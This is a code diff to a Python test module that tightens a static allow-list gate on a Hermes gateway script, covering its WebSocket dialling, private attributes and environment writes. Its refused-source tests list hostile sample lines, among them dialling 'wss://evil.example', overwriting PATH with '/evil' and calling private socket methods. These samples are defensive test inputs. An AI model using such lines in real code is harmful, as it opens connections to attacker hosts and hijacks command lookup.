@@ -890,11 +890,26 @@ class HermesScriptPolicy:
     alike; such a name is called or passed, never read through. `getattr`
     may read only `getattr_names`, as a literal, off an object the script
     made itself.
+
+    `slots` pins where an imported name may go: only as the value of one
+    keyword of one constructor (`connect` only as `AttachApi(dial=...)`).
+    `dial` is `(attribute, grant)`: the dialling callable may only be called,
+    and only with a url that comes, by name, from the first element the
+    `grant` call returned. A `_`-prefixed attribute is read only on `self`,
+    or as one of `private_attributes`, each with its reason. `os.environ`
+    is read freely and copied with `dict(...)`, set or removed only under
+    `environ_key`, and otherwise only emptied of the names a `for` over
+    `environ_removals` walks.
     """
 
     modules: dict[str, frozenset[str]]
     from_imports: dict[str, frozenset[str]]
     getattr_names: frozenset[str]
+    slots: dict[str, tuple[str, str]]
+    dial: tuple[str, str]
+    private_attributes: dict[str, str]
+    environ_key: str
+    environ_removals: str
     reason: str
 
 
@@ -904,9 +919,11 @@ class HermesScriptPolicy:
 # dials one WebSocket with `websockets.asyncio.client.connect`, to the URL the gateway's grant names; the asyncio it
 # uses is an event loop and nothing that opens a connection or a process. `_hermes_script_violations` holds it to
 # this closed allow list of imports, attributes and names, which blocks the realistic drift of a later edit calling
-# another Hermes, network or subprocess helper. It is not a sandbox: a deliberate private-attribute trick
-# (`loop._sock_connect`, `type(x)()`) or an allowed name called with other arguments is not caught, and the gate
-# does not check where the WebSocket goes.
+# another Hermes, network or subprocess helper. `connect` goes only into `AttachApi(dial=...)`, `api.dial` takes only
+# the url `api.grant()` returned, no private attribute of anything but `self` is read, `type` is not used, and
+# `os.environ` changes only as the `TERMINAL_CWD` set-and-restore and the launch-policy removal. It is not a
+# sandbox: an allowed Hermes function called with other arguments is not caught, and the url dialled is whatever
+# Hermes' grant returns; the gate does not check that destination.
 HERMES_INTERPRETER_SCRIPTS: dict[str, HermesScriptPolicy] = {
     "src/tui/attach/gateway_attach.py": HermesScriptPolicy(
         modules={
@@ -941,6 +958,11 @@ HERMES_INTERPRETER_SCRIPTS: dict[str, HermesScriptPolicy] = {
             "tui_gateway.entry": frozenset({"main"}),
         },
         getattr_names=frozenset({"detail", "reason_code", "state"}),  # an ensure receipt's fields
+        slots={"connect": ("AttachApi", "dial")},
+        dial=("dial", "grant"),
+        private_attributes={},  # it reads no private attribute of anything but itself
+        environ_key="TERMINAL_CWD",  # set for Hermes' path helper and restored (`HermesFiles.image`)
+        environ_removals="LAUNCH_POLICY_ENV",  # what Hermes' own bootstrap removes before it may start a gateway
         reason=(
             "the OMH TUI's gateway child (AGENTS.md, the OMH TUI bullet). On a Hermes that has the shared-gateway "
             "attach API it does what Hermes' own Ink TUI does: Hermes' `ensure_gateway_runtime` finds the "
@@ -962,7 +984,7 @@ HERMES_SCRIPT_FORBIDDEN_ATTRIBUTE_PREFIXES = ("sock_", "__")
 # Reflection that reaches a module or an object's namespace without naming the attribute.
 HERMES_SCRIPT_FORBIDDEN_NAMES = frozenset({
     "vars", "globals", "locals", "setattr", "delattr", "__import__", "eval", "exec", "compile", "__builtins__",
-    "breakpoint",
+    "breakpoint", "type",
 })
 HERMES_SCRIPT_GETATTR_NAMES = frozenset({"getattr", "hasattr"})
 
@@ -970,11 +992,17 @@ HERMES_SCRIPT_GETATTR_NAMES = frozenset({"getattr", "hasattr"})
 def _hermes_script_violations(tree: ast.Module, policy: HermesScriptPolicy) -> list[str]:
     """Every way `tree` steps outside `policy`'s allow list, one line each; [] when it stays inside it.
 
-    A static check of names, not a sandbox: what an allowed call is given, or a private attribute it reaches
-    by a route no list names, is beyond it.
+    A static check of names and of a few name flows (the dial slot, the grant's url, the environment's writes),
+    not a sandbox: what an allowed Hermes function is given, and where the grant's url points, are beyond it.
     """
     problems: list[str] = []
     parents = {id(child): node for node in ast.walk(tree) for child in ast.iter_child_nodes(node)}
+    # `type[...]` in an annotation is never evaluated (the script has `from __future__ import annotations`).
+    roots = [getattr(node, field) for node in ast.walk(tree) for field in ("annotation", "returns")
+             if isinstance(node, (ast.AnnAssign, ast.arg, *_FUNCTIONS)) and getattr(node, field, None) is not None]
+    annotations = {id(part) for root in roots for part in ast.walk(root)}
+    if not any(isinstance(node, ast.ImportFrom) and node.module == "__future__" for node in tree.body):
+        annotations = set()
     module_names: set[str] = set()
     imported: set[str] = set()
     for node in ast.walk(tree):
@@ -998,6 +1026,10 @@ def _hermes_script_violations(tree: ast.Module, policy: HermesScriptPolicy) -> l
                 problems.append(f"line {node.lineno}: `.{node.attr}`")
             if isinstance(node.value, ast.Name) and node.value.id in imported:
                 problems.append(f"line {node.lineno}: `{node.value.id}.{node.attr}` reads through an imported name")
+            private = node.attr.startswith("_") and not node.attr.startswith("__")
+            on_self = isinstance(node.value, ast.Name) and node.value.id == "self"
+            if private and not on_self and node.attr not in policy.private_attributes:
+                problems.append(f"line {node.lineno}: `.{node.attr}`, a private attribute of something not `self`")
         elif isinstance(node, ast.Name):
             parent = parents.get(id(node))
             if node.id in module_names:
@@ -1005,11 +1037,142 @@ def _hermes_script_violations(tree: ast.Module, policy: HermesScriptPolicy) -> l
                 if not through or parent.attr not in policy.modules[node.id]:
                     used = f"{node.id}.{parent.attr}" if through else f"`{node.id}` as a value"
                     problems.append(f"line {node.lineno}: {used}")
-            elif node.id in HERMES_SCRIPT_FORBIDDEN_NAMES:
+            elif node.id in HERMES_SCRIPT_FORBIDDEN_NAMES and not (node.id == "type" and id(node) in annotations):
                 problems.append(f"line {node.lineno}: `{node.id}`")
             elif node.id in HERMES_SCRIPT_GETATTR_NAMES:
                 problems.extend(_getattr_problems(node, parent, module_names | imported, policy))
+    problems.extend(_slot_problems(tree, parents, policy))
+    problems.extend(_dial_problems(tree, parents, policy))
+    problems.extend(_environ_problems(tree, parents, policy))
     return problems
+
+
+def _enclosing(node: ast.AST, parents: dict[int, ast.AST], kinds: tuple[type, ...]) -> ast.AST | None:
+    """The nearest ancestor of `node` of one of `kinds`, or None."""
+    current = parents.get(id(node))
+    while current is not None and not isinstance(current, kinds):
+        current = parents.get(id(current))
+    return current
+
+
+_FUNCTIONS = (ast.FunctionDef, ast.AsyncFunctionDef)
+
+
+def _slot_problems(tree: ast.Module, parents: dict[int, ast.AST], policy: HermesScriptPolicy) -> list[str]:
+    """A slotted name appears only as its keyword's value in its constructor, and that keyword takes only it."""
+    problems: list[str] = []
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Name) and node.id in policy.slots:
+            constructor, keyword = policy.slots[node.id]
+            slot = parents.get(id(node))
+            call = parents.get(id(slot))
+            if not (isinstance(slot, ast.keyword) and slot.arg == keyword and slot.value is node
+                    and isinstance(call, ast.Call) and isinstance(call.func, ast.Name) and call.func.id == constructor):
+                problems.append(f"line {node.lineno}: `{node.id}` used other than as `{constructor}({keyword}=...)`")
+        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
+            for name, (constructor, keyword) in policy.slots.items():
+                for given in node.keywords:
+                    if node.func.id == constructor and given.arg == keyword and not (
+                            isinstance(given.value, ast.Name) and given.value.id == name):
+                        problems.append(f"line {node.lineno}: `{constructor}({keyword}=...)` given something but `{name}`")
+    return problems
+
+
+def _dial_problems(tree: ast.Module, parents: dict[int, ast.AST], policy: HermesScriptPolicy) -> list[str]:
+    """The dialling callable is only called, and only with the url a `grant()` returned, followed by name."""
+    attribute, grant = policy.dial
+    problems: list[str] = []
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Attribute) or node.attr != attribute:
+            continue
+        call = parents.get(id(node))
+        if not isinstance(call, ast.Call) or call.func is not node or not call.args or not isinstance(call.args[0], ast.Name):
+            problems.append(f"line {node.lineno}: `.{attribute}` used other than as `.{attribute}(url, ...)`")
+            continue
+        scope = _enclosing(node, parents, _FUNCTIONS)
+        if not _comes_from_grant(tree, parents, scope, call.args[0].id, grant, depth=3):
+            problems.append(f"line {node.lineno}: `.{attribute}({call.args[0].id})`, a url no `{grant}()` returned")
+    return problems
+
+
+def _comes_from_grant(tree: ast.Module, parents: dict[int, ast.AST], scope: ast.AST | None, name: str, grant: str,
+                      depth: int) -> bool:
+    """Whether `name` in `scope` holds only the first value a `.grant()` call returned: assigned from one there,
+    or a parameter every caller of `scope` fills, by name, with such a value. Never a module-level name."""
+    if scope is None or depth == 0:
+        return False
+    stores = [node for node in ast.walk(scope) if isinstance(node, ast.Name) and node.id == name
+              and isinstance(node.ctx, ast.Store)]
+    parameters = [argument.arg for argument in (*scope.args.posonlyargs, *scope.args.args)]
+    if stores:
+        return name not in parameters and all(_unpacked_from_grant(store, parents, grant) for store in stores)
+    if name not in parameters:
+        return False
+    position = parameters.index(name)
+    references = [node for node in ast.walk(tree) if isinstance(node, ast.Name) and node.id == scope.name]
+    if not references:
+        return False
+    for reference in references:
+        call = parents.get(id(reference))
+        if not isinstance(call, ast.Call) or call.func is not reference or len(call.args) <= position:
+            return False
+        given = call.args[position]
+        if not isinstance(given, ast.Name):
+            return False
+        if not _comes_from_grant(tree, parents, _enclosing(call, parents, _FUNCTIONS), given.id, grant, depth - 1):
+            return False
+    return True
+
+
+def _unpacked_from_grant(store: ast.Name, parents: dict[int, ast.AST], grant: str) -> bool:
+    """`name, ... = <x>.grant()`: the store is the first element of a tuple target of a `.grant()` call."""
+    target = parents.get(id(store))
+    assign = parents.get(id(target))
+    if not (isinstance(target, ast.Tuple) and target.elts and target.elts[0] is store and isinstance(assign, ast.Assign)):
+        return False
+    value = assign.value
+    return (isinstance(value, ast.Call) and isinstance(value.func, ast.Attribute) and value.func.attr == grant
+            and not value.args and not value.keywords)
+
+
+def _environ_problems(tree: ast.Module, parents: dict[int, ast.AST], policy: HermesScriptPolicy) -> list[str]:
+    """`os.environ` is read, copied, set or removed under `environ_key`, or emptied of `environ_removals`; no more."""
+    problems: list[str] = []
+    for node in ast.walk(tree):
+        if not (isinstance(node, ast.Attribute) and node.attr == "environ" and isinstance(node.value, ast.Name)
+                and node.value.id == "os"):
+            continue
+        use = parents.get(id(node))
+        if isinstance(use, ast.Subscript) and use.value is node:
+            keyed = isinstance(use.slice, ast.Constant) and use.slice.value == policy.environ_key
+            if isinstance(use.ctx, ast.Load) or (isinstance(use.ctx, ast.Store) and keyed):
+                continue
+            problems.append(f"line {node.lineno}: `os.environ[{ast.unparse(use.slice)}]` written or deleted")
+        elif isinstance(use, ast.Attribute) and use.value is node:
+            call = parents.get(id(use))
+            if not isinstance(call, ast.Call) or call.func is not use:
+                problems.append(f"line {node.lineno}: `os.environ.{use.attr}` used other than called")
+            elif use.attr == "get":
+                continue
+            elif use.attr == "pop" and call.args and _removable(call.args[0], parents, policy):
+                continue
+            else:
+                problems.append(f"line {node.lineno}: `os.environ.{use.attr}(...)`")
+        elif not (isinstance(use, ast.Call) and isinstance(use.func, ast.Name) and use.func.id == "dict"
+                  and use.args == [node] and not use.keywords):
+            problems.append(f"line {node.lineno}: `os.environ` as a value other than `dict(os.environ)`")
+    return problems
+
+
+def _removable(key: ast.AST, parents: dict[int, ast.AST], policy: HermesScriptPolicy) -> bool:
+    """A key `os.environ.pop` may take: `environ_key`, or the target of a `for` over `environ_removals`."""
+    if isinstance(key, ast.Constant):
+        return key.value == policy.environ_key
+    if not isinstance(key, ast.Name):
+        return False
+    loop = _enclosing(key, parents, (ast.For,))
+    return (isinstance(loop, ast.For) and isinstance(loop.target, ast.Name) and loop.target.id == key.id
+            and isinstance(loop.iter, ast.Name) and loop.iter.id == policy.environ_removals)
 
 
 def _getattr_problems(node: ast.Name, parent: ast.AST | None, bound: set[str], policy: HermesScriptPolicy) -> list[str]:
@@ -1203,6 +1366,10 @@ class NoNetworkClientInSource(unittest.TestCase):
             )
 
     def test_a_hermes_interpreter_script_entry_names_nothing_it_no_longer_uses(self) -> None:
+        def imported_names(tree: ast.Module) -> set[str]:
+            return {alias.asname or alias.name for node in ast.walk(tree) if isinstance(node, ast.ImportFrom)
+                    for alias in node.names}
+
         trees = dict(_source_modules())
         for script, policy in HERMES_INTERPRETER_SCRIPTS.items():
             tree = trees[script]
@@ -1215,8 +1382,13 @@ class NoNetworkClientInSource(unittest.TestCase):
             read = {node.args[1].value for node in ast.walk(tree) if isinstance(node, ast.Call)
                     and isinstance(node.func, ast.Name) and node.func.id in HERMES_SCRIPT_GETATTR_NAMES
                     and len(node.args) > 1 and isinstance(node.args[1], ast.Constant)}
+            text = (REPO_ROOT / script).read_text(encoding="utf-8")
             unused = sorted(
-                [f"{module}.{name}" for module, names in policy.modules.items() for name in names
+                [f"slot {name}" for name in policy.slots if name not in imported_names(tree)]
+                + [f"private attribute {name}" for name in policy.private_attributes
+                   if not any(isinstance(node, ast.Attribute) and node.attr == name for node in ast.walk(tree))]
+                + [f"environ {key}" for key in (policy.environ_key, policy.environ_removals) if key not in text]
+                + [f"{module}.{name}" for module, names in policy.modules.items() for name in names
                  if (module, name) not in used]
                 + [f"from {module} import {name}" for module, names in policy.from_imports.items() for name in names
                    if (module, name) not in imported]
@@ -1290,6 +1462,34 @@ class NoNetworkClientInSource(unittest.TestCase):
             "import socket": "import socket",
             "import subprocess": "import subprocess",
             "from http.client import HTTPConnection": "from http.client import HTTPConnection",
+            # the dial slot: `connect` only as `AttachApi(dial=...)`, `.dial` only with the grant's url
+            "from websockets.asyncio.client import connect\nconnect('wss://evil.example/x')": "AttachApi(dial=...)",
+            "from websockets.asyncio.client import connect\nhop = connect": "AttachApi(dial=...)",
+            "AttachApi(dial=print)": "given something but `connect`",
+            "api.dial('wss://evil.example/x')": "`.dial` used other than",
+            "url = 'wss://evil.example/x'\napi.dial(url)": "a url no `grant()` returned",
+            "url, protocols = api.grant()\nurl = 'wss://evil.example/x'\napi.dial(url)": "a url no `grant()` returned",
+            "def go(api):\n    url, protocols = api.grant()\n    return api.dial(protocols)": "a url no `grant()` returned",
+            "def relay(api, url):\n    return api.dial(url)\nrelay(api, 'wss://evil.example/x')": "a url no",
+            "def relay(api, url):\n    return api.dial(url)\nhop = relay": "a url no",
+            "hop = api.dial": "`.dial` used other than",
+            # private attributes of anything but `self`, and `type`
+            "asyncio.get_running_loop()._sock_connect(None, ('h', 1))": "private attribute",
+            "loop._ssock": "private attribute",
+            "loop._make_socket_transport(None, None)": "private attribute",
+            "asyncio.Queue()._loop": "private attribute",
+            "type(loop)": "`type`",
+            "kind = type": "`type`",
+            # the environment: only TERMINAL_CWD set and restored, and the launch policy removed
+            "os.environ['PATH'] = '/evil'": "written or deleted",
+            "del os.environ['TERMINAL_CWD']": "written or deleted",
+            "os.environ.update(PATH='/evil')": "os.environ.update",
+            "os.environ.setdefault('PATH', '/evil')": "os.environ.setdefault",
+            "os.environ.pop('PATH', None)": "os.environ.pop",
+            "os.environ.clear()": "os.environ.clear",
+            "for name in ('PATH',):\n    os.environ.pop(name, None)": "os.environ.pop",
+            "env = os.environ": "as a value",
+            "hop = os.environ.pop": "used other than called",
         }
         for source, named in refused.items():
             with self.subTest(source=source):
@@ -1297,8 +1497,13 @@ class NoNetworkClientInSource(unittest.TestCase):
                 self.assertTrue(problems, f"the gate let `{source}` through")
                 self.assertIn(named, " ".join(problems))
         allowed = (
-            made + "asyncio.run(asyncio.wait([]))\nfrom websockets.asyncio.client import connect\nconnect('ws://h')\n"
-            "receipt = object()\ngetattr(receipt, 'state', None)\nos.environ.get('X')\n"
+            made + "asyncio.run(asyncio.wait([]))\nfrom websockets.asyncio.client import connect\n"
+            "api = AttachApi(dial=connect)\nreceipt = object()\ngetattr(receipt, 'state', None)\n"
+            "os.environ.get('X')\nos.environ['TERMINAL_CWD'] = '/w'\nos.environ.pop('TERMINAL_CWD', None)\n"
+            "copy = dict(os.environ)\nfor name in LAUNCH_POLICY_ENV:\n    os.environ.pop(name, None)\n"
+            "def relay(api, url):\n    return api.dial(url)\n"
+            "def main(api):\n    url, protocols = api.grant()\n    return relay(api, url)\n"
+            "self._serial = 1\n"
         )
         self.assertEqual(_hermes_script_violations(ast.parse(allowed), policy), [])
 
